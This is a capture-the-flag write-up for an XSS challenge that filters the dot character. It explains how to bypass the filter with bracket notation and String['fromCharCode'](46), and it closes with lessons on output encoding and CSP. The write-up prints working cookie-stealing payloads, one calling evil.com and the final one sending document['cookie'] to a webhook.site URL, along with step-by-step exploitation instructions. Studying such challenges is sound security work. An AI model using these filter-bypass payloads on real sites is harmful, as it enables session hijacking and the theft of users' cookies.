# PA_easyxss1 - CTF Writeup

## Challenge Description
This is a Cross-Site Scripting (XSS) challenge where we need to execute JavaScript code to steal user cookies. The application has a filtering mechanism that blocks the '.' character to prevent common XSS attacks.

## Initial Analysis
The target application accepts user input that gets reflected in the HTML page. Our goal is to inject malicious JavaScript that will:
1. Execute in the victim's browser
2. Steal their cookies
3. Send the stolen data to our webhook

## The Challenge: Dot Filter Bypass

### The Problem
The application filters the '.' (dot) character, which is commonly used in JavaScript for:
- Property access (e.g., `document.cookie`)
- Method calls (e.g., `String.fromCharCode()`)
- Domain names in URLs (e.g., `webhook.site`)

### Reconnaissance
Standard XSS payloads like these would be blocked:
```html
<script>document.cookie</script>
<img src=x onerror="window.location='http://evil.com?c='+document.cookie">
```

## Exploitation Strategy

### Bypass Technique: String.fromCharCode()
The key insight is to use `String['fromCharCode'](46)` instead of a literal dot character:
- `46` is the ASCII code for '.' character
- `String['fromCharCode']` uses bracket notation instead of dot notation
- This allows us to dynamically generate the dot character

### Final Payload Analysis
```html
<img src=x onerror="new Image()['src']='https://webhook'+String['fromCharCode'](46)+'site/your-webhook-id?c='+'document['cookie']">
```

### Payload Breakdown:

1. **`<img src=x onerror="...">`**
   - Uses an invalid image source to trigger the `onerror` event
   - Executes JavaScript when the image fails to load

2. **`new Image()['src']=`**
   - Creates a new Image object
   - Uses bracket notation instead of dot notation to set the `src` property
   - When `src` is set, the browser makes an HTTP request to that URL

3. **`'https://webhook'+String['fromCharCode'](46)+'site/...'`**
   - Constructs the webhook URL dynamically
   - `String['fromCharCode'](46)` generates the '.' character
   - Bypasses the dot filter by creating the dot programmatically
   - Results in: `https://webhook.site/your-webhook-id`

4. **`'?c='+'document['cookie']'`**
   - Adds a query parameter `c` with the stolen cookies
   - Uses bracket notation `document['cookie']` instead of `document.cookie`
   - Avoids the dot filter while accessing the cookie property

## Technical Details

### Why This Works:
- **Dynamic Character Generation**: `String.fromCharCode(46)` creates a dot without using the literal character
- **Bracket Notation**: `object['property']` is equivalent to `object.property` but doesn't use dots
- **HTTP Request via Image**: Setting an image's `src` automatically triggers an HTTP request
- **Cookie Exfiltration**: The stolen cookies are sent as URL parameters to our webhook

### Filter Bypass Summary:
| Blocked | Bypass Method |
|---------|---------------|
| `webhook.site` | `'webhook'+String['fromCharCode'](46)+'site'` |
| `document.cookie` | `document['cookie']` |
| `image.src` | `image['src']` |

## Exploitation Process

1. **Set up webhook**: Create a webhook at `webhook.site` to receive stolen data
2. **Inject payload**: Submit the crafted XSS payload to the vulnerable application
3. **Wait for victim**: When a user visits the page, the JavaScript executes
4. **Receive cookies**: The webhook receives the stolen cookies as query parameters

## Expected Result
When the payload executes, the webhook receives a request like:
```
GET /your-webhook-id?c=sessionid=abc123;userid=456;flag=flag{...}
```

## Key Insights

### Bypass Techniques Used:
1. **ASCII Character Generation**: Using `String.fromCharCode()` to create filtered characters
2. **Bracket Notation**: Accessing object properties without dots
3. **String Concatenation**: Building URLs dynamically to avoid detection
4. **Event-Based Execution**: Using `onerror` event for reliable JavaScript execution

### Why Standard Filters Fail:
- Simple character blacklists can often be bypassed with encoding or dynamic generation
- JavaScript's flexibility allows multiple ways to achieve the same result
- Bracket notation provides an alternative to dot notation for property access

## Lessons Learned
- Character-based filters are often insufficient for XSS protection
- JavaScript's dynamic nature allows creative bypass techniques
- Proper XSS prevention requires output encoding and Content Security Policy (CSP)
- Always test filter bypasses using alternative JavaScript syntax

## Flag
The stolen cookies contain the flag, which is captured by the webhook when the XSS payload executes successfully.
